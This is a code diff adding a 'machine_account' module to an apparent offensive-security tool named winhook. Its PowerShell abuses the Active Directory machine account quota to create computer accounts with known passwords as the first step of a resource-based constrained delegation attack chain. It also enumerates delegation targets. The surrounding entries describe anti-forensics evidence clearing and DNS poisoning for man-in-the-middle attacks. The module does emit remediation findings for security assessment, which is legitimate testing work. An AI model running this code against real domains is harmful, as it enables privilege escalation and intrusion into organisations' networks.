@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  machine_account: {
+    description:
+      "Machine account operations — create, delete, and manage computer accounts in Active Directory. Abuse ms-DS-MachineAccountQuota (default: 10) to create machine accounts for RBCD attacks, relay targets, and resource-based constrained delegation chains. Check quota, create accounts with known passwords, enumerate existing machine accounts and their creators",
+    args: "--action quota|create|delete|enum [--name COMPUTER_NAME] [--password PASSWORD]",
+  },
   adidns_poison: {
     description:
       "AD-integrated DNS poisoning — inject, modify, or delete DNS records in Active Directory-integrated DNS zones for man-in-the-middle attacks. Enumerate zones and record permissions, add wildcard records to capture all unresolved queries, inject A records pointing to attacker IP, check ADIDNS default permissions (Authenticated Users can create records by default). Complements responder_poison for targeted MITM",
@@ -17645,6 +17650,220 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function machineAccount(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "quota"
+  const name = argVal(args, "--name")
+  const password = argVal(args, "--password") || "CyberStrike123!"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Machine account operations...\n"]
+
+  if (action === "quota") {
+    const script = `
+Write-Output "=== Machine Account Quota Check ==="
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$root = [ADSI]"LDAP://$($domain.Name)"
+$maq = $root.Properties["ms-DS-MachineAccountQuota"].Value
+Write-Output "Domain: $($domain.Name)"
+Write-Output "ms-DS-MachineAccountQuota: $maq"
+Write-Output ""
+if ($maq -gt 0) {
+  Write-Output "STATUS: Any authenticated user can create up to $maq machine accounts"
+  Write-Output "This enables RBCD attacks without domain admin rights"
+  Write-Output ""
+  Write-Output "Attack chain:"
+  Write-Output "  1. winhook machine_account --action create --name EVIL$"
+  Write-Output "  2. winhook rbcd_chain --target TARGET --action exploit"
+  Write-Output "  3. winhook machine_account --action delete --name EVIL$ (cleanup)"
+} else {
+  Write-Output "STATUS: Machine account creation is restricted (quota = 0)"
+  Write-Output "Alternative: find existing machine accounts you can control"
+}
+Write-Output ""
+# Count current user's created machine accounts
+$whoami = whoami /user /fo csv | ConvertFrom-Csv
+$userSid = $whoami.SID
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=computer)(ms-DS-CreatorSID=$userSid))"
+$myMachines = $searcher.FindAll()
+Write-Output "Machine accounts created by current user: $($myMachines.Count) / $maq"
+foreach ($m in $myMachines) {
+  Write-Output "  $($m.Properties['samaccountname'][0])"
+}
+Write-Output ""
+Write-Output "Remaining quota: $($maq - $myMachines.Count)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const maqMatch = r.stdout.match(/ms-DS-MachineAccountQuota: (\d+)/)
+    if (maqMatch && parseInt(maqMatch[1]) > 0) {
+      findings.push({
+        checkId: "MACQ-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "ms-DS-MachineAccountQuota",
+        title: `Machine account quota allows ${maqMatch[1]} accounts — RBCD attacks possible`,
+        details: "Any authenticated user can create machine accounts usable for RBCD delegation attacks",
+        remediation: "Set ms-DS-MachineAccountQuota to 0 via ADSI Edit.",
+      })
+    }
+  }
+
+  if (action === "create") {
+    const computerName = name ? name.replace(/\$$/, "") : "CYBERSTRIKE"
+    const script = `
+Write-Output "=== Creating Machine Account ==="
+Write-Output "Name: ${computerName}$"
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
+$computersDN = "CN=Computers,$domainDN"
+# Check if already exists
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=${computerName}$)"
+$existing = $searcher.FindOne()
+if ($existing) {
+  Write-Output "[-] Machine account ${computerName}$ already exists"
+  return
+}
+try {
+  $computersOU = [ADSI]"LDAP://$computersDN"
+  $newComputer = $computersOU.Create("computer", "CN=${computerName}")
+  $newComputer.Put("sAMAccountName", "${computerName}$")
+  $newComputer.Put("userAccountControl", 4096)
+  $newComputer.Put("dNSHostName", "${computerName}.$($domain.Name)")
+  $newComputer.Put("servicePrincipalName", @(
+    "HOST/${computerName}",
+    "HOST/${computerName}.$($domain.Name)",
+    "RestrictedKrbHost/${computerName}",
+    "RestrictedKrbHost/${computerName}.$($domain.Name)"
+  ))
+  $newComputer.SetInfo()
+  # Set password
+  $newComputer.SetPassword('${password.replace(/'/g, "''")}')
+  $newComputer.SetInfo()
+  Write-Output "[+] SUCCESS: Machine account created"
+  Write-Output "    sAMAccountName: ${computerName}$"
+  Write-Output "    Password: ${password}"
+  Write-Output "    DN: CN=${computerName},$computersDN"
+  Write-Output ""
+  Write-Output "Next steps for RBCD attack:"
+  Write-Output "  winhook rbcd_chain --target TARGET_COMPUTER --action exploit"
+  Write-Output ""
+  Write-Output "Cleanup:"
+  Write-Output "  winhook machine_account --action delete --name ${computerName}"
+} catch {
+  Write-Output "[-] FAILED: $_"
+  Write-Output ""
+  if ($_.Exception.Message -match 'quota') {
+    Write-Output "Machine account quota exceeded. Check: winhook machine_account --action quota"
+  } elseif ($_.Exception.Message -match 'Access is denied') {
+    Write-Output "Insufficient permissions to create machine accounts"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("SUCCESS")) {
+      findings.push({
+        checkId: "MACQ-002",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: `${computerName}$`,
+        title: "Machine account created for RBCD attack chain",
+        details: `Machine account ${computerName}$ created with known password — usable for delegation attacks`,
+        remediation: "Delete the machine account and set MachineAccountQuota to 0.",
+      })
+    }
+  }
+
+  if (action === "delete") {
+    if (!name) {
+      output.push("ERROR: --name required for delete action")
+      return { output: output.join("\n"), findings }
+    }
+    const computerName = name.replace(/\$$/, "")
+    const script = `
+Write-Output "=== Deleting Machine Account: ${computerName}$ ==="
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(sAMAccountName=${computerName}$)"
+$result = $searcher.FindOne()
+if (-not $result) {
+  Write-Output "[-] Machine account ${computerName}$ not found"
+  return
+}
+try {
+  $obj = $result.GetDirectoryEntry()
+  $parent = $obj.Parent
+  $parentDE = [ADSI]$parent
+  $parentDE.Children.Remove($obj)
+  Write-Output "[+] SUCCESS: Machine account ${computerName}$ deleted"
+} catch {
+  Write-Output "[-] FAILED: $_ (you can only delete accounts you created)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Machine Account Enumeration ==="
+Write-Output ""
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(objectCategory=computer)"
+$searcher.PageSize = 1000
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","ms-DS-CreatorSID","operatingSystem","whenCreated","userAccountControl","msDS-AllowedToActOnBehalfOfOtherIdentity"))
+$computers = $searcher.FindAll()
+Write-Output "Total computer accounts: $($computers.Count)"
+Write-Output ""
+# Find user-created machine accounts (non-domain-join)
+Write-Output "=== User-Created Machine Accounts (MachineAccountQuota) ==="
+$userCreated = @()
+foreach ($c in $computers) {
+  $creatorSid = $c.Properties['ms-ds-creatorsid']
+  if ($creatorSid -and $creatorSid.Count -gt 0) {
+    $sidBytes = [byte[]]$creatorSid[0]
+    $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
+    try {
+      $creator = $sid.Translate([System.Security.Principal.NTAccount]).Value
+    } catch {
+      $creator = $sid.Value
+    }
+    Write-Output "  $($c.Properties['samaccountname'][0]) — created by: $creator ($(Get-Date $c.Properties['whencreated'][0] -Format 'yyyy-MM-dd'))"
+    $userCreated += $c
+  }
+}
+if ($userCreated.Count -eq 0) {
+  Write-Output "  None found"
+}
+Write-Output ""
+# Find computers with RBCD configured
+Write-Output "=== Computers with RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) ==="
+$rbcdComputers = $computers | Where-Object { $_.Properties['msds-allowedtoactonbehalfofotheridentity'] }
+foreach ($c in $rbcdComputers) {
+  Write-Output "  $($c.Properties['samaccountname'][0]) — has RBCD delegation configured"
+}
+if (-not $rbcdComputers) { Write-Output "  None found" }
+Write-Output ""
+# Find computers with unconstrained delegation
+Write-Output "=== Unconstrained Delegation ==="
+$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
+$unconstrained = $searcher.FindAll()
+foreach ($c in $unconstrained) {
+  Write-Output "  $($c.Properties['samaccountname'][0]) — UNCONSTRAINED delegation"
+}
+if ($unconstrained.Count -eq 0) { Write-Output "  None found (DCs are expected)" }
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function adidnsPoison(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const zone = argVal(args, "--zone")
@@ -22756,6 +22975,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   responder_poison: responderPoison,
   azure_ad_hybrid: azureAdHybrid,
   adidns_poison: adidnsPoison,
+  machine_account: machineAccount,
 }
 
 export const WinhookTool = Tool.define("winhook", {
